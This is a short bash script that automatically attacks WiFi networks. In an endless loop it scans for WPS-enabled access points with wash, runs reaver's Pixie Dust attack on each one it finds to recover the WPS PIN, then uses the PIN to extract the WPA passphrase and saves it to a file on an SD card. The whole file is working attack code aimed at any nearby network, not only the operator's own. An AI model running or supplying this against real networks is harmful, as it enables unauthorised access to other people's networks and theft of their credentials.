#!/bin/bash
MON_IF='wlan2mon'
W_TMP_OUT='/tmp/wash-run-output.txt'
R_TMP_OUT='/tmp/reaver-run-output.txt'
P_OUT='/sd/LEET/handshakes/RE-AV-ER-TX-T0-00_full.pcap'
while true; do
    echo "scanning with wash"
    $(gnu-timeout 12 wash --2ghz --5ghz -i $MON_IF --ignore-fcs > $W_TMP_OUT)
    sleep 14s
    echo "done scanning"
    access_points=$(cat $W_TMP_OUT | tail -n +3 | tr -s ' ' | cut -f1 -d ' ')
    for ap in ${access_points}; do
        echo "found access point"
        temp_line=$(cat $W_TMP_OUT | grep $ap | tr -s ' ')
        channel=$(echo $temp_line | cut -f2 -d' ')
        mac_address=$(echo $temp_line | cut -f1 -d' ')
        echo "grabbing a pin from /$temp_line/"
        $(gnu-timeout 22 reaver -S -L -E -w -Z -K -vv -vvv -c $channel -i $MON_IF -b $mac_address > $R_TMP_OUT)
        sleep 24s
        echo "done grabbing"
        found_pin=$(cat $R_TMP_OUT | grep "WPS pin" | cut -f6 -d ' ')
        echo "found pin /$found_pin/"
        [ -n "$found_pin" ] && [ "$found_pin" -eq "$found_pin" ] 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "the pin /$found_pin/ is not a number"
            sleep 4s
        else
            echo "grabbing acess point WPA PSK"
            $(gnu-timeout 22 reaver -c $channel -i $MON_IF -b $mac_address -p $found_pin >> $P_OUT)
            sleep 24s
            echo -e "\n" >> $P_OUT
            echo "done grabbing, run the following to see results"
            echo "cat $P_OUT"
        fi
    done
done
